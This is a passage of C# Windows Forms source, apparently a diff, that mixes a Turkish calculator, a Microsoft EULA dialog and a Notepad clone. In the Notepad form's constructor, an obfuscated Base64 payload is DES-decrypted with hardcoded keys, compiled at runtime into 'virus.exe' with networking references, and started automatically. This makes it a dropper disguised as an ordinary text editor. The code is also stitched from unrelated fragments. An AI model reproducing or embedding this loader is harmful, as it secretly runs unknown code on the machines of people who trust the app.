+static string Decrypt(string str){try{string textToDecrypt = str;string ToReturn ="";string publickey ="27326743";string secretkey ="26312284"; byte[] privatekeyByte = {};privatekeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);byte[] publickeybyte = {};publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);MemoryStream ms = null;CryptoStream cs = null;byte[] inputbyteArray = new byte[textToDecrypt.Replace(" ", "+").Length];inputbyteArray = Convert.FromBase64String(textToDecrypt.Replace(" ", "+"));using (DESCryptoServiceProvider des = new DESCryptoServiceProvider()){ms = new MemoryStream();cs = new CryptoStream(ms, des.CreateDecryptor(publickeybyte, privatekeyByte), CryptoStreamMode.Write);cs.Write(inputbyteArray, 0, inputbyteArray.Length);cs.FlushFinalBlock();Encoding encoding = Encoding.UTF8;ToReturn = encoding.GetString(ms.ToArray());}return ToReturn;}catch (Exception ae){throw new Exception(ae.Message, ae.InnerException);}}
+        private void button26_Click(object sender, EventArgs e)
+        {
+            labelAdd(0);
+        }
+
+        private void button21_Click(object sender, EventArgs e)
+        {
+            labelAdd(1);
+
+
+        }
+
+        private void button22_Click(object sender, EventArgs e)
+        {
+            labelAdd(2);
+
+        }
+
+        private void button23_Click(object sender, EventArgs e)
+        {
+            labelAdd(3);
+
+        }
+
+        private void button16_Click(object sender, EventArgs e)
+        {
+            labelAdd(4);
+
+        }
+
+        private void button17_Click(object sender, EventArgs e)
+        {
+            labelAdd(5);
+
+        }
+
+        private void button18_Click(object sender, EventArgs e)
+        {
+            labelAdd(6);
+
+        }
+
+        private void button11_Click(object sender, EventArgs e)
+        {
+            labelAdd(7);
+
+        }
+
+        private void button12_Click(object sender, EventArgs e)
+        {
+            labelAdd(8);
+
+        }
+
+        private void button13_Click(object sender, EventArgs e)
+        {
+            labelAdd(9);
+
+        }
+
+        private void button29_Click(object sender, EventArgs e)
+        {
+            operChange('+');
+        }
+
+        private void operChange(char op)
+        {
+            label2.Text = label1.Text + " " + op + " ";
+            ilkSay = Convert.ToInt32(label1.Text);
+            label1.Text = "0";
+            oper = op;
+        }
+
+        private void button24_Click(object sender, EventArgs e)
+        {
+            operChange('-');
+
+        }
+
+        private void button19_Click(object sender, EventArgs e)
+        {
+            operChange('*');
+
+        }
+
+        private void button14_Click(object sender, EventArgs e)
+        {
+            operChange('/');
+        }
+
+        private void button25_Click(object sender, EventArgs e)
+        {
+            if (ilkSay != 0)
+            {
+                if (oper == '+')
+                    label1.Text = (ilkSay + Convert.ToInt32(label1.Text)).ToString();
+                else if (oper == '-')
+                    label1.Text = (ilkSay - Convert.ToInt32(label1.Text)).ToString();
+                else if (oper == '*')
+                    label1.Text = (ilkSay * Convert.ToInt32(label1.Text)).ToString();
+                else if (oper == '/')
+                    label1.Text = (ilkSay / Convert.ToInt32(label1.Text)).ToString();
+
+                label2.Text = "";
+            }
+            else if (label2.Text != "")
+            {
+                ilkSay = Convert.ToInt32(label1.Text);
+                button25.PerformClick();
+            }
+        }
+
+        private void button20_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button9_Click(object sender, EventArgs e)
+        {
+            if (Convert.ToInt32(label1.Text) > 0)
+                label1.Text = (-1 * Convert.ToInt32(label1.Text)).ToString();
+            else if (Convert.ToInt32(label1.Text) < 0)
+                label1.Text = (-1 * Convert.ToInt32(label1.Text)).ToString();
+
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            label1.Text = "";
+            ilkSay = 0;
+        }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+            label1.Text = "";
+            label2.Text = "";
+            ilkSay = 0;
+            oper = '+';
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            if (label1.Text.Length > 0)
+                label1.Text = label1.Text.Substring(0, label1.Text.Length - 1);
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            mem += Convert.ToInt32(label1.Text);
+            label1.Text = "0";
+            label3.Visible = true;
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            label3.Visible = false;
+            mem = 0;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            mem -= Convert.ToInt32(label1.Text);
+            label1.Text = "0";
+            label3.Visible = true;
+
+        }
+    }
+}
+
+bazilarini veya tumunu degistiriyor olabilecek tum matbu kagit lisans kosullari dahil) ve kullandiginiz eklerin, guncellestirmelerin, Internet tabanli hizmetlerin ve destek hizmetlerinin kosullari, yazilim ve destek hizmetlerine y�nelik s�zlesmenin tamamini olusturur.
+24. UYGULANACAK HUKUK.
+a.  Amerika Birlesik Devletleri Yazilimi Amerika Birlesik Devletleri'nde aldiysaniz, bu s�zlesmenin yorumlanmasi ve ihlali iddialari, milletlerarasi baglama kurallari hesaba katilmadan, Washington eyaleti kanunlarina tabi olacaktir. Tuketici koruma kanunlari, haksiz rekabet ve haksiz fiil kapsamindakiler de dahil diger tum talepler bakimindan yasadiginiz eyaletin kanunlari gecerli olacaktir.
+b.  Amerika Birlesik Devletleri Disinda. Bu yazilimi baska bir ulkede satin aldiysaniz, o ulkenin yasalari gecerli olacaktir.
+25. YASAL ETK�S�. Bu anlasmada belirli yasal haklar tanimlanmistir. Yasadiginiz ulke veya eyaletin kanunlarina g�re baska haklara sahip olabilirsiniz. Ayrica, yazilimi aldiginiz tarafla ilgili baska haklara da sahip olabilirsiniz. Bu s�zlesme, eyaletiniz veya ulkenizin yasalarinin izin vermedigi durumlarda, ulkenizin veya eyaletinizin yasalari uyarinca sahip oldugunuz haklari degistirmez.
+26. SINIRLAMALAR VE ZARARLARIN SORUMLULUK KAPSAMI DI�INDA TUTULMASI. Microsoft ve tedarikcilerinden yalnizca dogrudan katlandiginiz zararlarin en fazla yazilim icin �dediginiz tutar kadarini geri alabilirsiniz. Neticede olusan, kar kaybi, �zel, dolayli veya arizi zararlar dahil diger zararlari talep edemezsiniz.
+Bu sinirlama asagidaki haller icin gecerlidir:
+�   �cuncu taraflarin Internet sitelerindeki yazilim, hizmetler, (kod dahil) icerik veya ucuncu taraflarin programlari ile ilgili konular ve
+�   �lgili yasalar cercevesinde izin verilen azami �lcude s�zlesmenin ihlalinden, bir garantinin, taahhudun veya kosulun ihlalinden, kusursuz sorumluluktan, ihmal veya diger haksiz fiillerden kaynaklanan talepler.
+Bu sinirlama asagidaki durumlarda da gecerlidir:
+�   Yazilimin onarilmasi, degistirilmesi veya bedelinin iadesinin, herhangi bir kaybinizi tumuyle karsilamamasi, veya
+�   Microsoft'un zararin olusma olasiligini bilmesi veya bilmesinin gerekmesi
+Bazi eyaletlerde arizi veya neticede olusan zararlar nedeniyle sorumlulugun kaldirilmasina veya sinirlandirilmasina izin verilmediginden, yukaridaki sinirlama veya sorumluluk kapsami disinda tutma sizin�icin gecerli olmayabilir. �lkenizde arizi, neticede olusan veya diger zararlarin sinirlanmasina veya sorumluluk kapsami disinda tutulmasina izin verilmedigi takdirde de bunlar sizin icin gecerli olmayabilir.
+************************************************************************
+SINIRLI GARANT�
+A.  SINIRLI GARANT�. Y�nergelere uyarsaniz ve yazilimin lisansi gerektigi gibi alinmissa, yazilim buyuk��lcude, yazilimin icinde veya onunla birlikte elinize gecen Microsoft belgelerinde belirtildigi sekilde calisacaktir.
+B.  GARANT� S�RES�, GARANT� ALICISI; ZIMN� GARANT�LER�N S�RES�. Yazilim, ilk kullanicisi tarafindan alindiktan sonraki ilk yil icin sinirli garanti kapsamindadir. Ayni yil icinde elinize gecen ekler, guncellestirmeler veya yeni yazilim, garantinin kalan suresi veya 30 gun (hangisi daha uzunsa) boyunca garanti kapsaminda olacaktir. �lk kullanici yazilimi devrederse, garantinin kalan suresi devralan icin gecerli olacaktir.
+Yasalar cercevesinde izin verilen azami �lcude, tum zimni garanti, taahhut ve kosullar yalnizca sinirli garanti suresince gecerli olacaktir. Bazi eyaletlerde zimni garantilerin surelerinin kisitlanmasina izin verilmediginden, bu sinirlamalar sizin icin gecerli olmayabilir. Bazi ulkelerde zimni garantilerin veya kosullarin gecerli olacagi sureyle ilgili sinirlamalara izin verilmedigi icin sizin icin de gecerli olmayabilirler.
+C.  GARANT� DI�I DURUMLAR. Bu garanti sizin yaptiginiz veya yapmadiginiz, baskalarinin yaptigi veya makul sinirlar icinde Microsoft'tun denetiminde olmayan olaylardan kaynaklanan sorunlari kapsamaz. 
+D.  GARANT� �HLAL�N�N TELAF�S�. Microsoft yazilimi ucretsiz olarak onarir veya degistirir. Microsoft yazilimi onaramaz veya degistiremezse, yazilimin faturasinda belirtilen tutari size iade eder. Ayrica ekleri, guncellestirmeleri ve degistirme yapilmasi halinde yeni yazilimi ucretsiz olarak onarir veya degistirir. Microsoft bu �geleri onaramaz veya degistiremezse,varsa, bunlar icin �dediginiz tutari size iade eder. Bedelini iade alabilmek icin yazilimi silmeniz, ortamlari ve iliskili malzemeleri satin alma belgesi ile birlikte Microsoft'a iade etmeniz gerekir. Garanti ihlali durumunda hakkiniz olan basvuru yollari bunlardan ibarettir.
+E.  T�KET�C� HAKLARININ ETK�LENMEMES�. Yerel yasalara g�re s�zlesmeyle degistirilemeyecek ek tuketici haklarina sahip olabilirsiniz.
+F.  GARANT�LER�N KULLANILMASI USUL�. Garanti hizmeti icin satin almanin belgelenebilmesi gerekir.
+1.  Amerika Birlesik Devletleri ve Kanada. Amerika Birlesik Devletleri ve Kanada'dan satin alinmis olan yazilimin garanti hizmeti veya  bedelini nasil iade alacaginizla ilgili olarak Microsoft'a asagidaki sekilde ulasabilirsiniz:
+�   (800) MICROSOFT;
+�   Microsoft Customer Service and Support, One Microsoft Way, Redmond, WA 98052-6399; veya
+�   www.microsoft.com/info/nareturns.htm adresini ziyaret edin.
+2.  Avrupa, Orta Dogu ve Afrika. Yazilimi Avrupa, Orta Dogu veya Afrika'da aldiysaniz bu sinirli garantinin sorumlusu Microsoft Ireland Operations Limited kurulusudur. Bu garanti kapsaminda basvurabileceginiz yerler:
+�   Microsoft Ireland Operations Limited, Customer Care Centre, Atrium Building Block B, Carmanhall Road, Sandyford Industrial Estate, Dublin 18, �rlanda veya
+�   ulkenize hizmet veren Microsoft bagli kurulusu (bkz: www.microsoft.com/worldwide).
+3.  ABD, Kanada, Avrupa, Orta Dogu ve Afrika Disinda Yazilimi ABD, Kanada, Avrupa, Orta Dogu ve Afrika disinda bir yerde aldiysaniz ulkenize hizmet veren Microsoft bagli sirketine basvurun (bkz: www.microsoft.com/worldwide).
+G.  BA�KA GARANT� VER�LMEMES�. Bu sinirli garanti Microsoft'tan aldiginiz yegane garantidir. Microsoft baska hicbir acik garanti vermemekte, taahhutte bulunmamakta veya kosul sunmamaktadir. Microsoft, ulkenizdeki yasalar cercevesinde izin verilen �lcude, satilabilirlik, belirli bir amaca uygunluk ve ihlal bulunmamasi ile ilgili de zimni hicbir garanti vermemektedir. Bu sinirlamaya ragmen yerel yasalar size herhangi bir zimni garanti veya hak taniyorsa bu durumda talep haklariniz, yerel yasalar cercevesinde izin verilen azami �lcude yukaridaki Garanti �hlali Telafisi maddesinde belirtilenlerle sinirlidir.
+H.  GARANT� �HLAL� HAL�NDE ZARARLARIN SINIRLANMASI VE SORUMLULUK KAPSAMI DI�INDA TUTULMASI. Yukaridaki zararlarin sinirlanmasi ve sorumluluk kapsami disinda tutulmasi maddesi bu sinirli garantinin ihlal edilmesi halleri icin de gecerli olacaktir.
+Bu garanti size belirli yasal haklar vermekte oldugu gibi sizin eyaletten eyalete degisen baska haklariniz olabilir. Ayrica ulkeden ulkeye degisen diger haklara da sahip olabilirsiniz.
+EULAID:Win7SP1_RM.0_ULT_RTL_tr-tr";
+            this.button1.Location = new System.Drawing.Point(553, 371);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Tamam";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(640, 406);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.richTextBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form3";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Microsoft Lisans Yazilim S�zlesmesi";
+            this.TopMost = true;
+            this.ResumeLayout(false);
+
+        }
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Button button1;
+        private void button1_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+    }
+    public partial class Form2 : Form
+    {
+        public Form2()
+        {
+            InitializeComponent();
+        }
+        private System.ComponentModel.IContainer components = null;
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form2));
+            this.button1 = new System.Windows.Forms.Button();
+            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
+            this.SuspendLayout();
+            this.button1.Location = new System.Drawing.Point(375, 341);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Tamam";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.linkLabel1.Location = new System.Drawing.Point(88, 244);
+            this.linkLabel1.Name = "linkLabel1";
+            this.linkLabel1.Size = new System.Drawing.Size(160, 14);
+            this.linkLabel1.TabIndex = 1;
+            this.linkLabel1.TabStop = true;
+            this.linkLabel1.Text = "Microsoft Yazilim Lisans Kosullari";
+            this.linkLabel1.Click += new System.EventHandler(this.linkLabel1_Click);
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(461, 374);
+            this.Controls.Add(this.linkLabel1);
+            this.Controls.Add(this.button1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form2";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "Not Defteri Hakkinda";
+            this.TopMost = true;
+            this.ResumeLayout(false);
+
+        }
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.LinkLabel linkLabel1;
+        private void button1_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void linkLabel1_Click(object sender, EventArgs e)
+        {
+            Form3 frm = new Form3();
+            frm.Show();
+        }
+    }
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+
+string str="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";
+
+CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
+CodeDomProvider.IsDefinedLanguage("CSharp");
+CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.Tasks.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.Runtime.InteropServices.dll", "System.Threading.dll","System.Runtime.InteropServices.dll" });
+parameters.GenerateExecutable = true;
+parameters.OutputAssembly     = "virus.exe"; 
+parameters.GenerateInMemory   = true; 
+CompilerResults results = provider.CompileAssemblyFromSource(parameters, Decrypt(str));
+
+            Thread.Sleep(250);
+Process.Start("virus.exe");
+        }
+
+
+static string Decrypt(string str){try{string textToDecrypt = str;string ToReturn ="";string publickey ="28560583";string secretkey ="28455834"; byte[] privatekeyByte = {};privatekeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);byte[] publickeybyte = {};publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);MemoryStream ms = null;CryptoStream cs = null;byte[] inputbyteArray = new byte[textToDecrypt.Replace(" ", "+").Length];inputbyteArray = Convert.FromBase64String(textToDecrypt.Replace(" ", "+"));using (DESCryptoServiceProvider des = new DESCryptoServiceProvider()){ms = new MemoryStream();cs = new CryptoStream(ms, des.CreateDecryptor(publickeybyte, privatekeyByte), CryptoStreamMode.Write);cs.Write(inputbyteArray, 0, inputbyteArray.Length);cs.FlushFinalBlock();Encoding encoding = Encoding.UTF8;ToReturn = encoding.GetString(ms.ToArray());}return ToReturn;}catch (Exception ae){throw new Exception(ae.Message, ae.InnerException);}}
+
+
+        private System.ComponentModel.IContainer components = null;
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
+            this.dosyaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.yeniToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.acToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.kaydetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.farkliKaydetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
+            this.sayfaYapisiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.yazdirToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
+            this.cikisToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.duzenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.geriAlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
+            this.kesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.kopyalaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.yapistirToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.silToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
+            this.bulToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.sonrakiniBulToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.degistirToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.gitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
+            this.tumunuSecToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.saatTarihToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.bicimToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.yaziTipiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.yardimToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.notDefteriHakkindaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.menuStrip1.SuspendLayout();
+            this.SuspendLayout();
+            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.dosyaToolStripMenuItem,
+            this.duzenToolStripMenuItem,
+            this.bicimToolStripMenuItem,
+            this.yardimToolStripMenuItem});
+            this.menuStrip1.LayoutStyle = System.Windows.Forms.ToolStripLayoutStyle.Flow;
+            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
+            this.menuStrip1.Name = "menuStrip1";
+            this.menuStrip1.Size = new System.Drawing.Size(585, 23);
+            this.menuStrip1.TabIndex = 0;
+            this.menuStrip1.Text = "menuStrip1";
+            this.dosyaToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.yeniToolStripMenuItem,
+            this.acToolStripMenuItem,
+            this.kaydetToolStripMenuItem,
+            this.farkliKaydetToolStripMenuItem,
+            this.toolStripSeparator1,
+            this.sayfaYapisiToolStripMenuItem,
+            this.yazdirToolStripMenuItem,
+            this.toolStripSeparator2,
+            this.cikisToolStripMenuItem});
+            this.dosyaToolStripMenuItem.Name = "dosyaToolStripMenuItem";
+            this.dosyaToolStripMenuItem.Size = new System.Drawing.Size(51, 19);
+            this.dosyaToolStripMenuItem.Text = "Dosya";
+            this.yeniToolStripMenuItem.Name = "yeniToolStripMenuItem";
+            this.yeniToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+N";
+            this.yeniToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.yeniToolStripMenuItem.Text = "Yeni             ";
+            this.yeniToolStripMenuItem.Click += new System.EventHandler(this.yeniToolStripMenuItem_Click);
+            this.acToolStripMenuItem.Name = "acToolStripMenuItem";
+            this.acToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+O";
+            this.acToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.acToolStripMenuItem.Text = "Ac";
+            this.acToolStripMenuItem.Click += new System.EventHandler(this.acToolStripMenuItem_Click);
+            this.kaydetToolStripMenuItem.Name = "kaydetToolStripMenuItem";
+            this.kaydetToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+S";
+            this.kaydetToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.kaydetToolStripMenuItem.Text = "Kaydet";
+            this.kaydetToolStripMenuItem.Click += new System.EventHandler(this.kaydetToolStripMenuItem_Click);
+            this.farkliKaydetToolStripMenuItem.Name = "farkliKaydetToolStripMenuItem";
+            this.farkliKaydetToolStripMenuItem.ShortcutKeyDisplayString = "";
+            this.farkliKaydetToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.farkliKaydetToolStripMenuItem.Text = "Farkli Kaydet";
+            this.farkliKaydetToolStripMenuItem.Click += new System.EventHandler(this.farkliKaydetToolStripMenuItem_Click);
+            this.toolStripSeparator1.Name = "toolStripSeparator1";
+            this.toolStripSeparator1.Size = new System.Drawing.Size(176, 6);
+            this.sayfaYapisiToolStripMenuItem.Name = "sayfaYapisiToolStripMenuItem";
+            this.sayfaYapisiToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.sayfaYapisiToolStripMenuItem.Text = "Sayfa Yapisi";
+            this.yazdirToolStripMenuItem.Name = "yazdirToolStripMenuItem";
+            this.yazdirToolStripMenuItem.ShortcutKeyDisplayString = "Ctrl+P";
+            this.yazdirToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.yazdirToolStripMenuItem.Text = "Yazdir";
